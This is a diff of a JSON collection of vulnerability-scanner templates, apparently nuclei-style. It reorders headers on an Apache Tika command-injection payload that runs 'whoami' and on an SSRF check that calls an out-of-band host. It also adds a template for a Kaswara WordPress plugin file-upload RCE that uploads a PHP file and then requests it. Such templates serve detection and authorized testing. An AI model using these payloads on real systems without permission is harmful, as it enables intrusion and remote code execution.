@@ -6403,11 +6403,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Content-type": "image/jp2",
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue"
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -9786,8 +9786,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -13980,6 +13980,21 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/wp-admin/admin-ajax.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24284",
+      "info": {
+        "name": "WordPress Kaswara Modern VC Addons - File Upload RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin-ajax.php?action=uploadFontIcon HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=------------------------d3be34324392a708\n\n--------------------------d3be34324392a708\nContent-Disposition: form-data; name=\"fonticonzipfile\"; filename=\"{{zip_file}}.zip\"\nContent-Type: application/octet-stream\n\n{{hex_decode('504B03040A0000000000FA73F454B2333E07140000001400000006001C00')}}{{php_file}}{{hex_decode('555409000366CBD76267CBD76275780B000104F50100000414000000')}}{{php_cmd}}{{hex_decode('0A504B01021E030A00000000002978F454E49BC1591300000013000000060018000000000001000000A48100000000')}}{{php_file}}{{hex_decode('555405000366CBD76275780B000104F50100000414000000504B050600000000010001004C000000530000000000')}}\n--------------------------d3be34324392a708\nContent-Disposition: form-data; name=\"fontsetname\"\n\n{{zip_file}}\n--------------------------d3be34324392a708\nContent-Disposition: form-data; name=\"action\"\n\nuploadFontIcon\n--------------------------d3be34324392a708--\n",
+            "GET /wp-content/uploads/kaswara/fonts_icon/{{zip_file}}/{{php_file}} HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
